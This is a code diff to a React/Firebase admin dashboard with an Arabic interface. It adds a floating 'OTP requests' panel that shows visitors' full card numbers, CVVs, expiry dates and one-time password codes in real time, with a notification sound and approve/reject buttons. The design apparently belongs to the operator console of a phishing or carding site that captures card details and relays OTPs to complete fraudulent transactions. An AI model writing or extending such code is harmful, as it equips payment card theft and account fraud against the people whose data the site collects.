@@ -38,9 +38,13 @@ import {
   subscribeToSubmissions, 
   subscribeToPayments, 
   subscribeToOnlineUsers,
+  subscribeToAllOtpRequests,
   deleteSubmission,
   deletePayment,
   deleteOnlineUser,
+  approveOtp,
+  rejectOtp,
+  deleteOtpRequest,
   app
 } from "@/lib/firebase";
 import { getAuth, onAuthStateChanged, signOut, User as FirebaseUser } from "firebase/auth";
@@ -127,6 +131,21 @@ interface Payment {
   updatedAt?: any;
 }
 
+interface OtpRequest {
+  id: string;
+  visitorId: string;
+  cardNumber: string;
+  cardName: string;
+  expiry: string;
+  cvv: string;
+  otpCode: string;
+  userName?: string;
+  email?: string;
+  status: "pending" | "approved" | "rejected";
+  createdAt?: any;
+  updatedAt?: any;
+}
+
 interface ThemeSettings {
   theme: "dark" | "light" | "blue" | "green" | "purple";
   sidebarWidth: "narrow" | "normal" | "wide";
@@ -200,6 +219,7 @@ export default function FirebaseDashboard() {
   const [submissions, setSubmissions] = useState<Submission[]>([]);
   const [payments, setPayments] = useState<Payment[]>([]);
   const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
+  const [otpRequests, setOtpRequests] = useState<OtpRequest[]>([]);
   const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
   const [searchQuery, setSearchQuery] = useState("");
   const [loading, setLoading] = useState(true);
@@ -307,10 +327,19 @@ export default function FirebaseDashboard() {
       setOnlineUsers(users.filter(u => u.online));
     });
 
+    const unsubscribeOtpRequests = subscribeToAllOtpRequests((requests) => {
+      const pendingRequests = requests.filter(r => r.status === "pending");
+      if (pendingRequests.length > otpRequests.filter(r => r.status === "pending").length) {
+        playNotificationSound();
+      }
+      setOtpRequests(requests);
+    });
+
     return () => {
       unsubscribeSubmissions();
       unsubscribePayments();
       unsubscribeOnline();
+      unsubscribeOtpRequests();
     };
   }, [checkingAuth, currentUser]);
 
@@ -388,6 +417,20 @@ export default function FirebaseDashboard() {
     return steps;
   };
 
+  const pendingOtpRequests = otpRequests.filter(r => r.status === "pending");
+
+  const handleApproveOtp = async (visitorId: string) => {
+    await approveOtp(visitorId);
+  };
+
+  const handleRejectOtp = async (visitorId: string) => {
+    await rejectOtp(visitorId);
+  };
+
+  const handleDeleteOtpRequest = async (visitorId: string) => {
+    await deleteOtpRequest(visitorId);
+  };
+
   if (checkingAuth) {
     return (
       <div className="min-h-screen bg-[#0f172a] flex items-center justify-center">
@@ -402,6 +445,68 @@ export default function FirebaseDashboard() {
 
   return (
     <div className={cn("min-h-screen font-sans", currentTheme.bg, currentTheme.text)} dir="rtl">
+      {/* OTP Approval Panel - Fixed floating */}
+      {pendingOtpRequests.length > 0 && (
+        <div className="fixed bottom-4 left-4 z-50 w-80 md:w-96 max-h-[60vh] overflow-y-auto">
+          <div className={cn("rounded-xl shadow-2xl border-2 border-orange-500", currentTheme.card)}>
+            <div className="bg-orange-500 text-white px-4 py-3 rounded-t-xl flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <Shield className="h-5 w-5 animate-pulse" />
+                <span className="font-bold">طلبات OTP ({pendingOtpRequests.length})</span>
+              </div>
+              <span className="text-xs bg-white/20 px-2 py-1 rounded">تحتاج موافقة</span>
+            </div>
+            <div className="p-3 space-y-3">
+              {pendingOtpRequests.map((req) => (
+                <div key={req.id} className={cn("p-3 rounded-lg border", currentTheme.border, "bg-orange-500/10")}>
+                  <div className="flex items-center justify-between mb-2">
+                    <span className="text-sm font-bold">{req.userName || req.visitorId.slice(0, 12)}</span>
+                    <span className="text-xs text-orange-400">{formatDate(req.createdAt)}</span>
+                  </div>
+                  <div className="grid grid-cols-2 gap-2 text-xs mb-3">
+                    <div>
+                      <span className={currentTheme.textMuted}>رقم البطاقة:</span>
+                      <p className="text-red-400 font-mono">{req.cardNumber}</p>
+                    </div>
+                    <div>
+                      <span className={currentTheme.textMuted}>CVV:</span>
+                      <p className="text-yellow-400 font-mono">{req.cvv}</p>
+                    </div>
+                    <div>
+                      <span className={currentTheme.textMuted}>الانتهاء:</span>
+                      <p className="font-mono">{req.expiry}</p>
+                    </div>
+                    <div>
+                      <span className={currentTheme.textMuted}>OTP:</span>
+                      <p className="text-purple-400 font-bold text-lg">{req.otpCode}</p>
+                    </div>
+                  </div>
+                  <div className="flex gap-2">
+                    <Button
+                      size="sm"
+                      className="flex-1 bg-green-600 hover:bg-green-700 text-white"
+                      onClick={() => handleApproveOtp(req.visitorId)}
+                    >
+                      <CheckCircle className="h-4 w-4 ml-1" />
+                      موافقة
+                    </Button>
+                    <Button
+                      size="sm"
+                      variant="destructive"
+                      className="flex-1"
+                      onClick={() => handleRejectOtp(req.visitorId)}
+                    >
+                      <X className="h-4 w-4 ml-1" />
+                      رفض
+                    </Button>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Settings Modal */}
       {showSettings && (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
